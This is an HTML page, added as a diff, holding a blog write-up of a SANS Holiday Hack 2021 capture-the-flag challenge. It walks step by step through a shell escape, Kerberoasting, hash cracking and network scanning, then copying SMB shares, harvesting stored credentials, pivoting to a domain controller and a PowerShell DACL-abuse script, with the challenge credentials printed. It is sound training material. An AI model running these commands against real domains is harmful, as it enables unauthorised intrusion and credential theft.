@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8"  />
+  <meta http-equiv="x-ua-compatible" content="ie=edge"  />
+  <meta name="viewport" content="width=device-width, initial-scale=1"  />
+
+  <title>
+    The Mind Palace
+  </title>
+
+  <link rel="stylesheet" href="/css/main.css">
+
+  <link
+    rel="canonical"
+    href="http://localhost:4000/write_ups/2021_sans_hhc/obj/2022-01-06-SANS-Holiday-Hack-Objective-8/"
+  />
+
+  <link
+    href="https://fonts.googleapis.com/css?family=Open Sans:400,300,700,800,600"
+    rel="stylesheet"
+    type="text/css"
+  />
+
+  <link
+    href="http://fonts.googleapis.com/css?family=Muli:400,300"
+    rel="stylesheet"
+    type="text/css"
+  />
+</head>
+
+  <body>
+    <aside>
+  <div class="container">
+    <nav>
+      <ul>
+ 
+<li><a href="/home/">Home</a></li>
+  
+<li><a href="/resume/">Resume</a></li>
+  
+<li><a href="/contact/">Contact</a></li>
+  
+<li><a href="/courses/">Course Work</a></li>
+                                                 
+<li><a href="/write_ups">Write Ups</a></li>
+      </ul>
+      </li>
+      </ul>
+    </nav>
+  </div>
+</aside>
+
+<header>
+  <h1><a href="">The Mind Palace</a></h1>
+</header>
+
+    <main>
+      <article><h2></h2>
+<time>Jan 6, 2022</time>
+
+<h1 id="kerberoasting-on-an-open-fire">Kerberoasting on an Open Fire</h1>
+
+<p><strong>Objective</strong>: Obtain the sleigh research document from a host on the Elf University domain. What is the first ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season?<br />
+<strong>Location</strong>: ElfU Portal Link - No associated Elf<br />
+<strong>Hint Terminal</strong>: <a href="/write_ups/2021_sans_hhc/term/2022-01-07-SANS-Holiday-Hack-Hoho-No">Hoho…No</a><br />
+<strong>Hints</strong>:</p>
+<ol>
+  <li>Kerberoast and AD Abuse Talk - Check out <a href="https://www.youtube.com/watch?v=iMh8FTzepU4">Chris Davis’ talk</a> <a href="https://github.com/chrisjd20/hhc21_powershell_snippets">and scripts</a> on Kerberoasting and Active Directory permissions abuse.</li>
+  <li>Kerberoasting and Hashcat Syntax - Leran about <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">Kerberoasting</a> to leverage domain credentials to get usernames and crackable hashes for service accounts.</li>
+  <li>Finding Domain Controllers - There will be some <code class="language-plaintext highlighter-rouge">10.X.X.X</code> networks in your routing tables that may be interesting. Also consider adding <code class="language-plaintext highlighter-rouge">-PS22,445</code> to your <code class="language-plaintext highlighter-rouge">nmap</code> scans to “fix” default probing for unprivileged scans.</li>
+  <li>Hashcat Mangling Rules - <a href="https://github.com/NotSoSecure/password_cracking_rules">OneRuleToRuleThemAll.rule</a> is great for mangling when a password dictionary isn’t enough.</li>
+  <li>CeWL for Wordlist Creation - <a href="https://github.com/digininja/CeWL">CeWL</a> can generate some great wordlists from websites, but it will ignore digits by default.</li>
+  <li>Stored Credentials - Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes!</li>
+  <li>Active Directory Interrogation - Investigating Active Directory errors is harder without <a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a>, but there are <a href="https://social.technet.microsoft.com/Forums/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell">native</a> <a href="https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf">methods</a></li>
+</ol>
+
+<h2 id="write-up">Write Up</h2>
+
+<p>The talk the Chris Davis hosted is extremely helpful for this challenge. The talk should give you ideas on how and where to start, pivot, and navigate around the environment.</p>
+
+<p>To start, all we are given is registration portal for <a href="https://register.elfu.org/">Elf University</a>. Let’s make an account.</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_1.png" alt="Elfu Registration Page" width="750" /></p>
+<p align="center"><strong>Figure 1: Elfu Registraion Landing Page</strong></p>
+
+<p>After creating an account, we are given a set of credentials and instructions on how to access the grading system.</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_2.png" alt="Elfu Registration Confirmation" width="750" /></p>
+<p align="center">
+    <strong>Figure 2: Elfu Registration Confirmation and Credentials</strong><br />
+    Your credentials will be different.
+</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh etucdegcur@grades.elfu.org -p 2222
+
+ElfU Domain Username: etucdegcur
+ElfU Domain Password: Bjfawoxod#
+</code></pre></div></div>
+
+<h2 id="the-shell">The Shell</h2>
+
+<p>When we ssh in to the grading portal, we are immediately met with the grading applicaiton.</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_3.png" alt="Elfu Grading Shell" width="750" /></p>
+<p align="center">
+    <strong>Figure 3: Elfu Grading Service</strong>
+</p>
+
+<p>Let’s see if we can break out of the shell. Regular escape techniques won’t work here, but we can try to background the program somehow with <code class="language-plaintext highlighter-rouge">Ctrl + &lt;letter&gt;</code>.
+After a few different tries, it looks like <code class="language-plaintext highlighter-rouge">Ctrl+d</code> is the magic letter to get us to a python shell. In my case, I did</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_4.png" alt="Python CLI" width="750" /></p>
+<p align="center">
+    <strong>Figure 4: Python Command Line Interface</strong><br />
+    We've broken our of the intended grading shell. We should be able to run python commands in here now.
+</p>
+
+<p>I’m not sure why this worked, so if anyone has any insight, please feel free to educate me!</p>
+
+<p>Let’s go ahead and get a bash shell using the <code class="language-plaintext highlighter-rouge">os</code> module that comes with python</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
+os.system("/bin/bash")
+</code></pre></div></div>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_5.png" alt="Bash Shell" width="750" /></p>
+<p align="center">
+    <strong>Figure 5: Bash Shell on Grading Server</strong><br />
+    We got a bash shell!
+</p>
+
+<p>I’m in.</p>
+
+<h2 id="enumerate">Enumerate!</h2>
+
+<p>Once we drop in to the machine, we’ll do some quality of life things (change shell and change local password) and then take some steps to figure out where we are and what our permissions looks like.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chsh --shell /bin/bash &lt;username&gt;
+$ passwd
+$ id
+$ uname -a
+$ sudo -l
+$ ip addr
+</code></pre></div></div>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_6.png" alt="Initial Foothold Enumeration" width="750" /></p>
+<p align="center">
+    <strong>Figure 6: Initial Enumeration of Grade Server</strong>
+</p>
+
+<p>With the above commands, there are a few things to note:</p>
+<ol>
+  <li>We are an unprivilieged user</li>
+  <li>We are on a Linux box on the <code class="language-plaintext highlighter-rouge">elfu.local</code> domain</li>
+  <li>We cannot run anything as a privileged user</li>
+  <li>The machine we are on resides in the <code class="language-plaintext highlighter-rouge">172.17.0.0/16</code></li>
+</ol>
+
+<p>Let’s ping the domain and see what comes back</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ping -c4 elfu.local
+</code></pre></div></div>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_7.png" alt="Finding the Domain Controller" width="750" /></p>
+<p align="center">
+    <strong>Figure 7: Domain Controller Found</strong>
+</p>
+
+<p>Immediately we can see that there is another domain that is internal to this one</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Domain: holidayhack2021.internal
+IP: 10.128.1.53
+</code></pre></div></div>
+
+<p>Since we know that we will have to conduct some kind of Active Directory attack, let’s use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">impacket’s <code class="language-plaintext highlighter-rouge">GetUserSPNs.py</code></a> as detailed in the talk.</p>
+
+<p>We need to upload this script to the box we are currently on. We’ll use SCP since we know we have access to the machine with our unprivileged user account.</p>
+
+<p>Download the script to your local machine, browse to the download location and then upload the file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp -P 2222 GetUserSPNs.py &lt;username&gt;@grades.elfu.org:/home/&lt;username&gt;/
+</code></pre></div></div>
+
+<p>The file should land in your home directory. Change the permissions and run it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod +x GetUserSPNs.py
+python3 GetUserSPNs.py -dc-ip 10.128.1.53 elfu.local/&lt;username&gt;:&lt;domain password&gt; -request
+</code></pre></div></div>
+
+<p>Looks like we found a vulnerable account, <code class="language-plaintext highlighter-rouge">elfu_svc</code>!</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_8.png" alt="Kerberoasting the elfu_svc Account" width="750" /></p>
+<p align="center">
+    <strong>Figure 8: Service Account Vulnerable to Kerberoasting</strong>
+</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$aba9cc937c957875d486462b35494ba8$dad3e65c66a
+8a30e78a60c77713bbd6721e95c671d7a5164804f52a965068fb4800473aab17c97a6651693d609ebf07285a7770d67059
+598c74953358c124cb01cbd39f2837d9f4a5635641257b879aac35111b2c85e39e2fa17433f5d4fe49346a905c386a7df3
+411f91250129f2f0d367ede051162041b33ea24ccc27cfed485683d2f879b6f3eccf1a0855bda9989150611e17dab1ba22
+1bc360a598155b6a7ba8504d68c9eafba5306ee3c32b6fe6cf548cfaa803e0954f411568170992eaeafc44684574faad48
+12bda73f31e776d39797a518d973c86ac3a04c53c8042ad9911e7586c785f9e86228ed355a065c1816174ef81e889249c4
+ef833955eed1931ad94bdec2532eb4be17ed3af0d725d7944274d126ed89423c33339057e1b7ea8408c96cb6b2fe90d14f
+c34269fb637ab51646a93b02a88fead678091675807ef4e35ea6f678ccad0f09bc53108c28643b1ad375b0cf0bf8f7e0fe
+fa5155b5c06e45d6b47409982ef023270f7d09f35cfaa9c943d4f9afb1f4fbde7e5cb1be607ba339000e21808553f5dbe9
+8cc463c0b20665505e740b2db7ee2ef0d7f3010065434f27b72b498f20bccc3cdae5d84828c9d90e79ba7fbce3df1e52cc
+35c5aca6965ece0953320a4682877695449d22894b1c3a4fb5ed6e99fe08a1ddb787a7c7eeef4cd4689eda2d7b45dfd46d
+d3d49e6718c0af56be545ef7a19059c39829774045357eb1f1c6901fef60a30dca924da70dc785998be036a0ab6a5c0b82
+e7043ec3ed5995340ed048d07a8f64ce20bf94a99d6c912ed5db5589da735f2fb6d8c7d498991529a459247b0ed7350160
+6f886b0e8560161727d08e1fb55c192f8053d7a6bbfd092f28abc5d894b9fdbf4587582db3e5fe0e3640e40cf32a59106b
+58c47c5e12c7e9de989b40dc95af9a52d514ef4bc2064d9c5edf53685cf92ad845b422b5712d07ccf8bd3c9e61f4144e0b
+c6329719cb78dc2ce02558b4e8af4fdfd4f580d543c42126070a2367b81fc7b15908a17da901ccfbd284c8c2ebc45da406
+2ab921da93e3556c92e57cb935c0d062a978aa234a71d51378b2f1bf5bc679f54679c4ac40eb394e25818f8d5058fd4d00
+045555fbbaa962a8253535f7360318afefa3b7c08c9029e1f7e4020b8f7be1a4914c1be1d9beff4d5da4c2432506817fd9
+0548a73e18eb7d8dbe14f7e3d398333cc99786a8eb8575e7b1660b54bd7d2adf821570ab88fe7651c4d05758112d38adca
+ad7b95202da28295b6cf5561a3e5cecdd6e50181f5f5b9fd2a3f017ef36013c56f0db7157b1b77c58d22b6830dc9854007
+fccaf06475bbf85f8efb6d9f69dcd0d0e80abcc715055c063bc2c1c729fab6e84589f8ceab7399093637fae344bac363fd
+5933b310910d3d4b4dd1420f8899a197e492b00010a8d6e0d13436d18b4625498a7cf6168313dde4c217eac
+</code></pre></div></div>
+
+<p>Make sure to put this hash in a text file. This will make the cracking process simpler.</p>
+
+<h2 id="crack-the-hash">Crack the Hash</h2>
+
+<p>Hints 4 and 5 help a lot to crack this hash.</p>
+
+<p>The first thing that we need to do is generate our wordlist. We’ll use CeWL for this.</p>
+
+<p>Hint 5 indicates that we should probably include digits when scraping the website, so knowing that, let’s construct our command</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl -o https://register.elfu.org -w wordlist.txt --with-numbers
+</code></pre></div></div>
+
+<p>This will put the word list in to <code class="language-plaintext highlighter-rouge">wordlist.txt</code></p>
+
+<p>This is the list we will use to crack the hash for the <code class="language-plaintext highlighter-rouge">elfu_svc</code> account we enumerated.</p>
+
+<p>We’ll use the rule set defined in hint 4 to mangle the words in the wordlist we just generated.</p>
+
+<p>Let’s get to crackin’!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -a 0 -m 13100 crackMe.txt --potfile-disable -r /usr/share/hashcat/rules/
+password_cracking_rules/OneRuleToRuleThemAll.rule --force -O -w 4 ./wordlist.txt
+</code></pre></div></div>
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_9.png" alt="elfu_svc Credentials" width="750" /></p>
+<p align="center">
+    <strong>Figure 9: Cracked Credentials for the <em>elfu_svc</em> Account</strong>
+</p>
+
+<p>Looks like we were able to crack the hash!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: elfu_svc
+Password: Snow2021!
+</code></pre></div></div>
+
+<h2 id="enumerateagain">Enumerate…again!</h2>
+
+<p>Now we need to figure out what to do with these credentials.</p>
+
+<p>Let’s see what other hosts are around us in this subnet. We can do this by creating a quick ping script using bash. We’ll just ping the <code class="language-plaintext highlighter-rouge">172.17.0.0/24</code> subnet, since that is significantly fewer hosts, and work from there.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for i in {1..254}; do (ping -c1 172.17.0.$i | grep "bytes from" &amp;); done
+</code></pre></div></div>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_10.png" alt="Network Ping Sweep" width="750" /></p>
+<p align="center">
+    <strong>Figure 10: Host Enumeration</strong>
+</p>
+
+<p>It appears that there are 5 hosts that are up</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1
+172.17.0.2
+172.17.0.3
+172.17.0.4
+172.17.0.5
+</code></pre></div></div>
+
+<p>Let’s do a port scan on all of these hosts and see what we find.</p>
+
+<p>First, let’s see if nmap is on the host. <code class="language-plaintext highlighter-rouge">which nmap</code> shows that <code class="language-plaintext highlighter-rouge">nmap</code> is installed and is located in <code class="language-plaintext highlighter-rouge">/usr/bin/nmap</code></p>
+
+<p>Let’s fingerprint the 5 hosts we found.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -p- -Pn 172.17.0.1,2,3,4,5
+
+# -sV : tells nmap to enumerate the services on the ports that it finds
+# -p- : tells nmap to scan all ports, instead of the top 1000 ports
+# -Pn : disables ping to check if the host is alive. 
+#       We already know that they are up with our initial ping sweep
+</code></pre></div></div>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_11.png" alt="Service Enumeration" width="750" /></p>
+<p align="center">
+    <strong>Figure 11: Service Scan of Discovered Hosts</strong>
+</p>
+
+<p>Hosts <code class="language-plaintext highlighter-rouge">172.17.0.3</code>, <code class="language-plaintext highlighter-rouge">172.17.0.4</code>, and <code class="language-plaintext highlighter-rouge">172.17.0.5</code> look like they may have SMB shares that we can check out.</p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">smbclient</code> we can try to list the shares for each of the hosts.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -L \\172.17.0.3
+smbclient -L \\172.17.0.4
+smbclient -L \\172.17.0.5
+</code></pre></div></div>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_12.png" alt="SMB Share Enumeration" width="750" /></p>
+<p align="center">
+    <strong>Figure 12: Enumerated Shares of Hosts <em>172.17.0.3</em>, <em>172.17.0.4</em>, and <em>172.17.0.5</em></strong>
+</p>
+
+<p>Host <code class="language-plaintext highlighter-rouge">172.17.0.4</code> looks like it hosts some interesting things (it should be noted that the target host with the necessary shares may changed. When I first solved this challenge, the host with the relevant shares was <code class="language-plaintext highlighter-rouge">172.17.0.3</code>). We need to access the <code class="language-plaintext highlighter-rouge">research_dep</code> in order to get the file we are looking for. Additionally, it looks like there is a share specifically for the <code class="language-plaintext highlighter-rouge">elfu_svc</code> account: <code class="language-plaintext highlighter-rouge">elfu_svc_shr</code>. This share may hold some information that will allow us to pivot deeper in to the network.</p>
+
+<p>But before we go treasure hunting, let’s see if the <code class="language-plaintext highlighter-rouge">elfu_svc</code> account has access to the <code class="language-plaintext highlighter-rouge">research_dep</code> share.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient \\\\172.17.0.4\\research_dep -U elfu_svc
+</code></pre></div></div>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_13.png" alt="Attempted Access of Target Directory" width="750" /></p>
+<p align="center">
+    <strong>Figure 13: Attempt to Access Research Share</strong>
+</p>
+
+<p>No luck here, so I guess we gotta jump in to the other share.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient \\\\172.17.0.4\\elfu_svc_shr -U elfu_svc
+</code></pre></div></div>
+
+<p>Success! It looks like we have access to the share and there are a ton of scripts that live on this share. Taking hint 6, let’s see if we can find some stored credentials.</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_14.png" alt="Attempted Access of Service Share" width="750" /></p>
+<p align="center">
+    <strong>Figure 14: Successful Access of Service Share</strong>
+</p>
+
+<p>Let’s copy all of these scripts to the grading host, and then grep through them.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: \&gt; mask ""
+smb: \&gt; recurse ON
+smb: \&gt; prompt OFF
+smb: \&gt; mget *
+</code></pre></div></div>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_15.png" alt="File Exfiltration" width="750" /></p>
+<p align="center">
+    <strong>Figure 15: Exfiltration of Scripts from Service Share</strong>
+</p>
+
+<p>Since this is <code class="language-plaintext highlighter-rouge">elfu</code>, let’s grep for the keyword <code class="language-plaintext highlighter-rouge">elf</code> in all the files</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grep --ignore-case elf *
+</code></pre></div></div>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_16.png" alt="Keyword Search for Stored Credentials" width="750" /></p>
+<p align="center">
+    <strong>Figure 16: Enumeration of Stored Credentials from Service Share Scripts</strong>
+</p>
+
+<p>The second entry, <code class="language-plaintext highlighter-rouge">GetProcessInfo.ps1</code>, looks like it has an account of interest, as well as some stored credentials that we could possible work with.</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_17.png" alt="" width="750" /></p>
+<p align="center">
+    <strong>Figure 17: Stored Credentials of <em>remote_elf</em> Account</strong>
+</p>
+
+<p>Just as suspected, the script stores a variable that holds the password, and then passes the variable as well as the username as a credential in order to access <code class="language-plaintext highlighter-rouge">10.128.1.53</code>. This also means that <code class="language-plaintext highlighter-rouge">10.128.1.53</code> is likely of high interest to us.</p>
+
+<h2 id="pivot">Pivot</h2>
+
+<p>With our new found credentials, we can enter a <code class="language-plaintext highlighter-rouge">powershell</code> commandline prompt on the grading host and pivot in to <code class="language-plaintext highlighter-rouge">10.128.1.53</code>.</p>
+
+<p>Luckily, the grading host has <code class="language-plaintext highlighter-rouge">powershell</code> installed on it</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_18.png" alt="Powershell" width="750" /></p>
+<p align="center">
+    <strong>Figure 18: Powershell Exists on the Grading Server</strong><br />
+    We can use this fact to our advantage and run powershell commands in a hybrid domain environment
+</p>
+
+<p>We can store the credentials in a variable in this shell just like the script does by copying and pasting the first three lines of the script in to the powershell prompt we have invoked</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_19.png" alt="Storing Enumerating Credentials as Variables in Powershell" width="750" /></p>
+<p align="center">
+    <strong>Figure 18: Storing Enumerated Credentials as Variables in Powershell</strong>
+</p>
+
+<p>And then we can generate a remote session with the <code class="language-plaintext highlighter-rouge">10.128.1.53</code> machine</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; Enter-PSSession -ComputerName 10.128.1.53 -Credential $aCred -Authentication Negotiate
+</code></pre></div></div>
+
+<p>And we’re are in what appears to be <code class="language-plaintext highlighter-rouge">DC01</code>!</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_20.png" alt="Successful Pivot on to Domain Controller" width="750" /></p>
+<p align="center">
+    <strong>Figure 20: Successful Pivot on to Domain Controller</strong>
+</p>
+
+<h2 id="enumerateonce-again">Enumerate…Once Again!</h2>
+
+<p>So the goal of the challenge is to retrieve a research file. Presumably, there is a research group in this domain that we can add our unprivileged user account to.</p>
+
+<p>Running <code class="language-plaintext highlighter-rouge">Get-ADGroup -Filter *</code>, we see that there is in fact a research group named <code class="language-plaintext highlighter-rouge">Research Department</code></p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_21.png" alt="Enumeration of the Research Department Group" width="750" /></p>
+<p align="center">
+    <strong>Figure 21: Enumeration of the <em>Research Department</em> Group</strong>
+</p>
+
+<p>The next thing we need to check is to see if our current user has WriteDacl permissions for the <code class="language-plaintext highlighter-rouge">Research Department Group</code>.</p>
+
+<p>We can verify this using the following lines from Chris Davis’ KringleCon talk:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+PS &gt; $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+PS &gt; $domainDirEntry.get_ObjectSecurity().Access
+</code></pre></div></div>
+
+<p>This will push out who has permissions to what in the group.</p>
+
+<p>Scrolling up a bit, we can see that <code class="language-plaintext highlighter-rouge">remote_elf</code> has WriteDacl permissions to this group. This means we can add our unprivileged user account to the group to access the <code class="language-plaintext highlighter-rouge">research_dep</code> share!</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_22.png" alt="*remote_elf* WriteDacl Permissions to Research Department" width="750" /></p>
+<p align="center">
+    <strong>Figure 21: <em>remote_elf WriteDacl</em> Permissions to <em>Research Department</em> Group</strong>
+</p>
+
+<h2 id="escalate">Escalate</h2>
+
+<p>Using the information found in the previous section as well as the code snippets provided by Chris Davis, let’s add our unprivileged user account to the <code class="language-plaintext highlighter-rouge">Research Department</code> group.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-Type -AssemblyName System.DirectoryServices
+$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$username = "etucdegcur"
+$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$IdentityReference = (
+	New-Object System.Security.Principal.NTAccount("elfu.local\$username")).
+    Translate([System.Security.Principal.SecurityIdentifier])
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+	$IdentityReference,
+	([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"),
+	([System.Security.AccessControl.AccessControlType] "Allow"),
+	$propGUID, $inheritanceType, $nullGUID
+	)
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+$secOptions = $domainDirEntry.get_Options()
+$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
+$domainDirEntry.RefreshCache()
+$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
+$domainDirEntry.CommitChanges()
+$domainDirEntry.dispose()
+
+Add-Type -AssemblyName System.DirectoryServices
+$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,dc=local"
+$username = "etucdegcur"
+$password = "Bjfawoxod#"
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, 
+    $password
+$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
+$sid = $user.Translate([System.Security.Principal.SecurityIdentifier])
+$b = New-Object byte[] $sid.BinaryLength
+$sid.GetBinaryForm($b,0)
+$hexSID = [BitConverter]::ToString($b).Replace('-','')
+$domainDirEntry.Add("LDAP://&lt;SID=$hexSID&gt;")
+$domainDirEntry.CommitChanges()
+$domainDirEntry.dispose()
+</code></pre></div></div>
+
+<p>Verify that we are in the group now…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+$domainDirEntry.get_ObjectSecurity().Access
+
+Alternatively
+Get-ADPrincipalGroupMembership etucdegcur | select name
+</code></pre></div></div>
+
+<p>And now we should have access to the share!</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_23.png" alt="Unprivileged User is Now a Member of the Research Department" width="750" /></p>
+<p align="center">
+    <strong>Figure 23: Unprivileged user is Now a Member of the <em>Research Department</em></strong>
+</p>
+
+<h2 id="exfiltrate">Exfiltrate</h2>
+
+<p>Now that we are added to the <code class="language-plaintext highlighter-rouge">Research Department</code> group, let’s try to access the <code class="language-plaintext highlighter-rouge">research_dep</code> share with our unprivileged user account.</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_24.png" alt="Successful Access to Research Share" width="750" /></p>
+<p align="center">
+    <strong>Figure 24: Successful Access to Research Share</strong>
+</p>
+
+<p>Success!</p>
+
+<p>Pull the file with <code class="language-plaintext highlighter-rouge">mget *</code></p>
+
+<p>After we get the file to the grading server, we’ll have to pull it to our local host. We can do that with SCP.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp -P 2222 . etucdegcur@grades.elfu.org:~/SantaSecretToAWonderfulHolidaySeason.pdf .
+</code></pre></div></div>
+
+<p>It looks like the first ingredient it <code class="language-plaintext highlighter-rouge">Kindness</code>!</p>
+
+<p><img src="/assets/img/2021_sans_hhc/obj/obj08/picture_25.png" alt="Target Document" width="750" /></p>
+<p align="center">
+    <strong>Figure 25: Santa's Recipe to a Wonderful Holiday Season</strong>
+</p>
+
+<hr />
+<p align="center"><a href="/write_ups/2021_sans_hhc/obj/2022-01-06-SANS-Holiday-Hack-Objective-7">&lt; Objective 7</a> :: <a href="/write_ups/2021_sans_hhc/obj/2022-01-06-SANS-Holiday-Hack-Objective-9">Objective 9 &gt;</a></p>
+
+</article>
+      <footer>
+    <p>By <a href="https://c-velez.github.io">Chris Velez</a></p>
+</footer>
+
+    </main>
+  </body>
+</html>
